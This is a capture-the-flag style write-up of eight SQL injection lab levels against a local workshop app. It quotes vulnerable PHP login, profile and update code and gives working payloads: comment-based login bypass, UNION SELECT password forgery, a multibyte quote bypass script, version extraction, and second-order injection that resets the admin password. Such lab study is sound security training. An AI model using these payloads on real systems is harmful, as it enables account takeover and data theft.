@@ -1,0 +1,413 @@
+
+
+	[-Prerequisites-]
+	
+	
+		[db.sql]: Our database for all labs
+		[db.php]: include the make_connection() function, which is connect to the database db.sql
+		
+		[Others]: Nothing special
+		
+	
+	[-Exploitation-]
+	
+	
+		  
+		      
+		      ---------------level 1----------------
+		      |                                    |
+		      |          localhost:24001           |
+		      |                                    |
+		      --------------------------------------
+		      
+	[index.php]
+		
+		
+			
+			....
+			....
+
+			$sql = "SELECT username FROM users WHERE username='$post_username' AND password='$post_password'";
+			$query = $database->query($sql);
+			$user = $query->fetch_assoc(); // Get the first row
+
+			...
+			.....
+
+			if (isset($_POST["username"]) && isset($_POST["password"])) {
+				$post_username = $_POST["username"];
+				$post_password = $_POST["password"];
+				$message = loginHandler($post_username, $post_password);
+			}
+
+			include("static/html/login.html");
+			
+		=> Server takes the argument $_POST and execute the query, we can see that there are no restriction
+		[!] So what if we just take the $post_username to "admin" and all the rest of query becomes the comment?
+		
+		=> $sql = "SELECT username FROM users WHERE username='admin';#' AND password='$post_password'";
+		
+		=> username: admin';#
+	
+	[localhost:24001]
+	
+		Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL!
+		
+		=> Exploited!
+		
+		
+		
+		      ---------------level 2----------------
+		      |                                    |
+		      |             level2.php             |
+		      |                                    |
+		      --------------------------------------
+		      
+		      
+	[level2.php]
+	
+			....
+			......
+			
+			$sql = "SELECT username FROM users WHERE username=\"$post_username\" AND password=\"$post_password\"";
+			
+			....
+			......
+			
+		Kinda the same as previous level, but the mindset not changing
+		=> username: admin\"";#
+		
+		But seems like the payload not works, lets var_dump() it to see what actually happened
+		
+			string(71) "SELECT username FROM users WHERE username="admin\"";#" 
+		
+		So their backslash still there and our backslash disappear 
+		
+		[!] So, username: admin";#
+	
+	[level2.php]
+		
+		Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL!
+		
+		=> Exploited!
+			
+			
+			
+		      ---------------level 3----------------
+		      |                                    |
+		      |             level3.php             |
+		      |                                    |
+		      --------------------------------------
+		      
+		      
+		The same mindset as 2 previous level
+		
+		=> username: admin');#
+		
+		=> string(84) "SELECT username FROM users WHERE username=LOWER('admin');#') AND password=LOWER('1')"
+		
+	[level3.php]
+	
+		
+		Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL!
+		
+		=> Exploited!
+		
+		
+			
+		      ---------------level 4----------------
+		      |                                    |
+		      |             level4.php             |
+		      |                                    |
+		      --------------------------------------
+		      
+		This time is little bit harder, we cant use the same trick because of 
+		
+	[level4.php]
+	
+			
+			
+			$sql = "SELECT username, password FROM users WHERE username='$post_username'";
+			$query = $database->query($sql);
+			$user = $query->fetch_assoc();
+			...
+			.....
+			$username = $user["username"];
+			$password = $user["password"];
+			$post_password = md5($post_password);
+
+			....
+			......
+			$post_username = $_POST["username"];
+			$post_password = $_POST["password"];
+			$post_password = md5($post_password);
+
+			
+		[!] The query here select the username and password from the "input" ($post_username && $post_password) and use this to compare with username and password are query from the database
+		
+		
+			if ($password !== $post_password)
+			return "Wrong username or password";
+			if ($username === "admin")
+			return "Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about <a href='level5.php'>THIS LEVEL</a>!";
+			
+			
+		=> If the comparing successfully => Exploited
+		
+		=> So the mindset is, we need to inject the SQL query so this output username and password are the same with the post_username and post_password
+		
+		[!] There are a statement called "UNION" that can modify the output of "SELECT" query by combining output of 2 SELECT query	
+		
+		
+	[Termimal]
+	
+			>mysql SELECT username, password FROM users WHERE username='x' UNION SELECT username, password FROM users WHERE username = 'admin';
+			
+			+----------+----------------------------------+
+			| username | password                         |
+			+----------+----------------------------------+
+			| admin    | 13442cabe383b86d1e1d2ce653845349 |
+			+----------+----------------------------------+
+			
+			
+		Why i use 'x', because in the database username 'x' is not exists, so the output only is the output after "UNION SELECT"
+		=> So the output of entire query is the table content of 'admin'
+
+		[!] SOOO, the only thing that we dont know is the password, but FUN PART is that we can specify the value of "UNION SELECT" query
+		
+		
+	[Terminal]
+	
+			>mysql SELECT username, password FROM users WHERE username='x' UNION SELECT username, 'cute' FROM users WHERE username = 'admin';
+			
+			+----------+----------+
+			| username | password |
+			+----------+----------+
+			| admin    | cute     |
+			+----------+----------+
+			
+			
+		[!] But the input password have to be MD5 hash after
+		
+		
+		
+	[Payload]
+		
+			username: x' UNION SELECT username, MD5('cute') FROM users WHERE username = 'admin';#
+			password: cute
+			
+			
+	[localhost:24001/level4.php]
+	
+	
+			Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL!
+		
+		=> Exploited!
+		
+		      ---------------level 5----------------
+		      |                                    |
+		      |             level5.php             |
+		      |                                    |
+		      --------------------------------------
+			
+			
+			
+			So we can not use the quotes (') directly, so this time i use a chr function in python to bypass it,
+	[Tool]
+	
+			import requests
+			url = "http://localhost:24001/level5.php" 
+			datas = {"username": "admin" + chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
+			r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) 
+			print (r.text)		
+			
+			
+			
+		=> BOOM! Exploited!
+			
+			
+
+			
+			
+				
+		      ---------------level 6----------------
+		      |                                    |
+		      |             level6.php             |
+		      |                                    |
+		      --------------------------------------
+		      
+		      This lab seems to be easy one, just get the database version of query
+		      
+		      => our payload: id=10 UNION SELECT ALL %40%40VERSION 
+		      
+		      Why i choose 10, 10 is invalid so our first row is db_version 
+		      
+	[level6.php]
+	
+			......
+			........
+			$row = $db_result->fetch_assoc();
+			.......
+			
+			
+	[Terminal]
+	
+			SELECT content FROM posts WHERE id=10 UNION SELECT ALL @@VERSION;
+			+---------+
+			| content |
+			+---------+
+			| 8.0.36  |
+			+---------+
+			1 row in set (0.00 sec)
+
+			
+		=> Exploited!
+		
+		
+		      ---------------level 7----------------
+		      |                                    |
+		      |             level7.php             |
+	              |            Advanced Lab!           |
+		      |                                    |
+		      --------------------------------------
+		      
+		      I think the mindset of this lab seems no different the level 4, the only different is little bit harder
+		      Take a look around, you can see that
+		      
+		      
+		      
+	[level7.php]
+	
+	
+				$sql = "SELECT username FROM users WHERE username=? and password=?";
+				$statement = $database->prepare($sql);
+				$statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
+				$statement->execute();
+				$statement->store_result();
+				$statement->bind_result($result);
+				
+				----------------------------------
+				
+		      
+		      This is totally unbreakable since the bind_param() comes!
+		      
+		      
+		      
+	[profile.php]
+	
+	
+				<?php
+				session_start();
+				include("../db.php");
+				$database = make_connection("advanced_db");
+
+				...
+				.....
+					$sql = "SELECT email FROM users WHERE username='$username'";
+					$db_result = $database->query($sql);
+					$row = $db_result->fetch_assoc(); // Get the first row
+
+				......
+				.........
+				include("../static/html/profile.html");
+				
+				--------------------------------------
+				
+				
+				
+			This "$sql" seems vulnable like level 4!, so i think this is the only way that we can exploit!
+			[!] This take the variable '$username' which is taken from register.php
+		       ===> So the mindset is we create a new account that username contains "sensitive" query!
+		       
+		       
+		       
+	[register.php]
+	
+				Username: x' UNION SELECT password FROM users WHERE username = 'admin';#
+		       		Password: 123
+		       		
+		       		-------------------------------------------------------------------------
+		       		
+	[http://localhost:24001/advanced/profile.php]
+	
+				SQL Injection workshop
+				Get all information from user table
+				Your Email: 13442cabe383b86d1e1d2ce653845349 
+				
+				---------------------------------------------
+				
+			      
+			
+			Its hereee!!!
+			=> Exploited
+	       
+		       
+		      
+		      
+		      ---------------level 8----------------
+		      |                                    |
+		      |             level8.php             |
+		      |            Advanced Lab!           |
+		      |                                    |
+		      --------------------------------------
+		      
+		      The mindset and the "bridge" is the same as previous one!
+		      
+	[update.php]
+		      
+				if (isset($_POST['button'])) {
+			    	try {
+				$sql = "UPDATE users SET email='$email' WHERE username='$username'";
+				$db_result = $database->query($sql);
+				if ($db_result) {
+				    $message = "Successfully update your Email";
+				} else {
+				    $message = "Failed to update your email";
+				}
+			    	} catch (mysqli_sql_exception $e) {
+				$message = $e->getMessage();
+			    	}
+				}
+
+				include("../static/html/update.html");
+				
+				----------------------------------------
+				
+			Lets create a random account so that we can "update" the email!
+			
+			
+	[http://localhost:24001/advanced/update.php]
+	
+			
+				Enter your new Email:			
+				123@gmail.com', password = MD5('123') WHERE username='admin';#
+	
+				Successfully update your Email 
+				
+				-----------------------------------------------------
+				
+			=> Our new "admin" password is the MD5 hash of "123"
+	
+
+	 [http://localhost:24001/advanced/level8.php]
+	 
+	 
+	 			Wow you can finally log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}
+	 			
+	 	
+	 		=> EXPLOITED!!!
+		
+		
+	
+		
+			
+			
+			
+			
+		
+	
+		
+			
+	
+		
+	
